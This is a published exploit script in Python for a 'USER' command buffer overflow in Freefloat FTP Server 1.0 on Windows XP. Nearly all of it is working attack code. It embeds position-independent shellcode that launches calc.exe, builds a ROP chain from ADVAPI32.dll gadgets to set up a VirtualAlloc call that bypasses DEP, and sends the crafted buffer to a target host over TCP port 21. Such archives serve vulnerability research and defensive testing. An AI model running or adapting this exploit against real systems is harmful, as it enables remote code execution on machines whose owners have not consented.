# Exploit Title: Freefloat FTP Server 1.0 - 'USER' Remote Buffer Overflow (DEP Bypass - ADVAPI32.dll)
# Date: 22/01/2022
# Exploit Author: Michalis Antoniades
# Vendor Homepage: http://www.freefoat.com
# Software Link:  http://www.freefloat.com/software/freefloatftpserver.zip
# Version:        1.00
# Tested on: Windows XP Profesional version 2002 SP3 - x86 
# CVE : N/A

import sys, socket
from struct import pack

host = sys.argv[1]
port = 21

def send_exploit_request():

    # WinExec PopCalc PEB & Export Directory Table NullFree Position-Independent Shellcode
    shellcode = (b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e"
        b"\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43"
        b"\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b"
        b"\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0e\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75"
        b"\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61"
        b"\xc3\x68\xe4\xe5\xd9\xb6\xff\x55\x04\x89\x45\x10\x68\xa8\x59\xfc\xe6\xff\x55\x04\x89\x45\x14\x31\xc0"
        b"\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x54\x5b\x31\xc0\x50\x53\xff\x55\x10\x31\xc0\x50\x6a\xff"
        b"\xff\x55\x14")

    cmd = b"USER "
    va = pack("<L", (0x45454545))                # dummy VirtualAlloc Address # -0x1c
    va += pack("<L", (0x46464646))               # Shellcode return address   # -0x18
    va += pack("<L", (0x47474747))               # dummy shellcode address    # -0x14
    va += pack("<L", (0x48484848))               # dummy dwSize               # -0x10
    va += pack("<L", (0x49494949))               # dummy flAllocationType     # -0x0c
    va += pack("<L", (0x51515151))               # dummy flProtect            # -0x08
    
    offset = b"A" * (230 - len(va)-len(shellcode))

    # bad x0a x0d

    # ROP Gadgets - ADVAPI32.dll

    # Updating VAlloc address

    rop = pack("<L", 0x5d0c9bc3)        # mov edi, esp ; dec ecx ; retn 0x000C (comctl32.dll)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77dd9388)       # pop ebx ; ret
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0xfd409088)
    rop += pack("<L", 0x77de97ac)       # mov edx, ebx ; pop esi ; pop ebx ; retn 0x0010
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0xfd409088)
    rop += pack("<L", 0x77e2a172)       # mov ecx, dword [edx+0x03000000] ; ret
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77dd925b)       # mov eax, ecx ; ret
    rop += pack("<L", 0x77df563a)       # xchg eax, ebx 
    rop += pack("<L", 0x77e3ce41)       # adc eax, 0x77DD15E0 ; mov eax, edi ; pop edi ; ret
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77ddbf44)       # pop ecx ; ret
    rop += pack("<L", 0x66666198)       # 
    rop += pack("<L", 0x77ded855)       # pop edx ; sub edx, ecx ; add eax, edx ; pop ebp ; retn 0x0004
    rop += pack("<L", 0x66666174)       #
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77df3d99)       # mov dword [eax], ebx ; pop ebx ; pop ebp ; retn 0x0008 ;
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444445)

    # Updating shellcode address
    
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret

    rop += pack("<L", 0x77df563a)       # xchg eax, ebx ; ret (saving eax)    
    rop += pack("<L", 0x77de97ac)       # mov edx, ebx ; pop esi ; pop ebx ; retn 0x0010 ; (eax copied in edx)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77de80aa)       # mov eax, edx ; pop ebx ; pop ebp ; retn 0x0004 ; (eax in eax and edx)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77df563a)       # xchg eax, ebx ; ret (saving eax)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77dd9952)       # xor eax, eax ; ret
    rop += pack("<L", 0x77e25eef)       # pop eax ; ret
    rop += pack("<L", 0xffffff2e)
    rop += pack("<L", 0x77ded858)       # add eax, edx ; pop ebp ; retn 0x0004
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77df563a)       # xchg eax, ebx ; ret (saving eax)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77df3d99)       # mov dword [eax], ebx ; pop ebx ; pop ebp ; retn 0x0008 ;
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)

    # Updating shellcode address 2

    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77df563a)       # xchg eax, ebx ; ret (saving eax)
    rop += pack("<L", 0x77dd9952)       # xor eax, eax ; ret
    rop += pack("<L", 0x77e25eef)       # pop eax ; ret
    rop += pack("<L", 0xffffff2e)
    rop += pack("<L", 0x77ded858)       # add eax, edx ; pop ebp ; retn 0x0004 ;
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77df563a)       # xchg eax, ebx ; ret (saving eax)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77df3d99)       # mov dword [eax], ebx ; pop ebx ; pop ebp ; retn 0x0008 ;
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)

    # DW Size 

    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77df563a)       # xchg eax, ebx ; ret (saving eax)
    rop += pack("<L", 0x77dd9952)       # xor eax, eax ; ret
    rop += pack("<L", 0x77ddbf44)       # pop ecx ; ret
    rop += pack("<L", 0x66666111)       # 
    rop += pack("<L", 0x77ded855)       # pop edx ; sub edx, ecx ; add eax, edx ; pop ebp ; retn 0x0004
    rop += pack("<L", 0x66666711)       #
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77df563a)       # xchg eax, ebx ; ret (saving eax)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77df3d99)       # mov dword [eax], ebx ; pop ebx ; pop ebp ; retn 0x0008 ;
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)

    # updating flAllocationType (0x1000)

    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77df563a)       # xchg eax, ebx ; ret (saving eax)
    rop += pack("<L", 0x77dd9952)       # xor eax, eax ; ret
    rop += pack("<L", 0x77ddbf44)       # pop ecx ; ret
    rop += pack("<L", 0x66666111)       # 
    rop += pack("<L", 0x77ded855)       # pop edx ; sub edx, ecx ; add eax, edx ; pop ebp ; retn 0x0004
    rop += pack("<L", 0x66667111)       #
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77df563a)       # xchg eax, ebx ; ret (saving eax)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77df3d99)       # mov dword [eax], ebx ; pop ebx ; pop ebp ; retn 0x0008 ;
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)

    # updating flProtect (0x40)

    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77dd8e94)       # inc eax ; ret
    rop += pack("<L", 0x77df563a)       # xchg eax, ebx ; ret (saving eax)
    rop += pack("<L", 0x77dd9952)       # xor eax, eax ; ret
    rop += pack("<L", 0x77ddbf44)       # pop ecx ; ret
    rop += pack("<L", 0x66666111)       # 
    rop += pack("<L", 0x77ded855)       # pop edx ; sub edx, ecx ; add eax, edx ; pop ebp ; retn 0x0004
    rop += pack("<L", 0x66666151)       #
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77df563a)       # xchg eax, ebx ; ret (saving eax)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77df3d99)       # mov dword [eax], ebx ; pop ebx ; pop ebp ; retn 0x0008 ;
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)

    # align ESP with skeleton

    rop += pack("<L", 0x77ddbf44)       # pop ecx ; ret
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x66666125)       # 
    rop += pack("<L", 0x77ded855)       # pop edx ; sub edx, ecx ; add eax, edx ; pop ebp ; retn 0x0004
    rop += pack("<L", 0x66666111)       #
    rop += pack("<L", 0x44444444)
    rop += pack("<L", 0x77de97cf)       # xchg eax, esp ; ret  ; 
    rop += pack("<L", 0x44444444)
    
    padding = b"C" * 50
    end = b'\r\n'

    buf = cmd + shellcode + offset + va + rop + padding + end

    print("[+] Sending Exploit Request")
    print("Len buf:", len(buf))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(buf)
    s.recv(1024)
    s.close()

if __name__ == "__main__": 

    send_exploit_request()